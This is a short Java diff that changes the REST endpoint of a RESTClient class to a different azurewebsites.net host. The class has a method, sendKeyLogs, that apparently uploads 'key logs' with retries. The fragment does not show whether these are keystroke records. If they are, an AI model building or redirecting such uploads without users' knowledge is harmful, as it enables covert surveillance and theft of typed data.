@@ -12,7 +12,7 @@ import java.util.Base64;
 
 public class RESTClient {
 
-    private static final String REST_ENDPOINT = "https://sdp-data.azurewebsites.net/api/sdp_data";
+    private static final String REST_ENDPOINT = "https://sdp-data-premium.azurewebsites.net/api/sdp_data";
     private static final int MAX_RETRIES = 3;
 
     public RESTResponseWrapper sendKeyLogs(KeyLogsStructure keyLogsStructure, Runnable onRetry) throws IOException {
